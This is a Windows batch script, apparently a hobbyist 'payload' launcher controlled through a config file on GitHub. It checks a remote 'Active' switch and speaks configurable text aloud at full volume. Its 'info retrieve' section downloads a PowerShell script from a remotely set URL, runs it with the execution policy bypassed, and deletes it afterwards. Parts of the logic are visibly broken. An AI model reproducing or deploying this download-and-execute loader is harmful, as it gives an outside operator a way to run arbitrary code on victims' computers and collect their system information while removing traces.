@echo off
setlocal enabledelayedexpansion
:: Default color :: color 0F :: Set Console Window Properties :: mode con: cols=80 lines=25
:: Set the URL of the configuration file on GitHub, these is set to a default there is an empty template to in [https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg]
set "configUrl=https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg" 
set "config_local=Local-Config.cfg"
:: Set local path for "antidote" codes
set "local_antidote=%USERPROFILE%\OneDrive\Documentos\reaper_antidote_codes.cfg"
:: Initialize available_remote_config and active_status to expected values
set "available_remote_config="
set "active_status="

:: Fetch and process the configuration file
for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
    echo %%i | findstr /i "Active=true" >nul
    if !errorlevel! equ 0 (
        set "active_status=true"
    ) else (
        echo %%i | findstr /i "Active=false" >nul
        if !errorlevel! equ 0 (
            set "active_status=false"
        ) else (
            ping %configUrl% -n 1 >nul 2>&1
            if !errorlevel! neq 0 (
                set "available_remote_config=false"
            )
        )
    )
)
:: Process based on fetched configuration
if defined available_remote_config (
    if defined active_status (
        set "config_file=curl -s %configUrl%"
        goto Active
    ) else (
        echo Remote file available with "Active=false".
        pause
        exit /b 0
    )
) else (
    if exist "%config_local%" (
        findstr /i "Active=true" "%config_local%" >nul
        if !errorlevel! equ 0 (
            set "config_file=type %config_local%"
            goto Active
        ) else (
            echo Local configuration file is not active. Exiting...
            pause
            exit /b 0
        )
    ) else (
        echo Local configuration file not found. Exiting...
        pause
        exit /b 0
    )
)

:Active
:: Get variables
for /f "usebackq tokens=1* delims== " %%a in (`%config_file%`) do (
    
    if /i "%%a"=="TEXT_TO_SPEECH_ENABLED" (    
        :: text to speach
        set "text_to_speech_enabled=%%b"
    ) else if /i "%%a"=="TEXT_TO_SPEECH" (
        set "text_to_speech=%%b"
    ) else if /i "%%a"=="SCRIPT_INFR_ENABLED" (
        :: info reatrive
        set "script_infr_enabled=%%b"
    ) else if /i "%%a"=="SCRIPT_INFR_L" (
        :: info reatrive
        set "script_infr_l=%%b"
    ) else if /i "%%a"=="SCRIPT_INFR_N" (
        set "script_infr_n=%%b"
    )
)

:: Validate if all the required variables are set
:: text to speach enabled?
if not defined text_to_speech_enabled (
    set "text_to_speech_enabled=true"
    echo text to speach not defined to true/false
    pause
)
:: text to speach text?
if not defined text_to_speech (
    set "text_to_speech=No text to speech configured"
    echo No text to speech configured
    pause
)
:: info reatrive script enabled true/false
if not defined script_infr_enabled (
    set "script_infr_enabled=true"
    echo Info retreave is not defined to run [true/false]
    pause
)
:: info reatrive script link
if not defined script_infr_l (
    set "script_infr_l=https://raw.githubusercontent.com/raf181/Config/main/Project-1/config.cfg"
    echo no link is set retreaving the default script from [raf181/Script-Payload]
    pause
)
:: info reatrive name 
if not defined script_infr_n (
    set "script_infr_n=payload.ps1"
    pause
)

:: Script starts here ======================================================================================================= ::
:: ================================== ::
:: Custom payload: 
:: # Text to speech
:: # System information.ps1
::
::
:: ================================== ::

:: Text to speech payload =================================================================================================== ::
if /i "%text_to_speech_enabled%"=="true" (
    set "volumeLevel=100"
    :: Save VBScript code to a temporary file
    set "vbsScriptFile=%temp%\TextToSpeech.vbs"
    (
        echo Set speech = Wscript.CreateObject^("SAPI.SpVoice"^)
        echo speech.Volume = %volumeLevel%
        echo speech.Speak "%text_to_speech%"
    ) > "%vbsScriptFile%"
    :: Run the VBScript
    cscript //nologo "%vbsScriptFile%"
    :: Clean up the temporary VBScript file
    del "%vbsScriptFile%"
)
:: End of text to speech payload ============================================================================================== ::

:: Info reatrive payload ====================================================================================================== ::
if /i "%script_infr_enabled%"=="true" (
    :: Download the PowerShell script
    curl -o "%script_infr_n%" "%script_infr_l%"
    :: Run the downloaded PowerShell script
    PowerShell.exe -ExecutionPolicy Bypass -File "%script_infr_n%"
    :: Delete the downloaded PowerShell script
    del "%script_infr_n%"
)
:: Info reatrive payload end ================================================================================================== ::

:: Script ends here =========================================================================================================== ::
echo Script processed successfully.
pause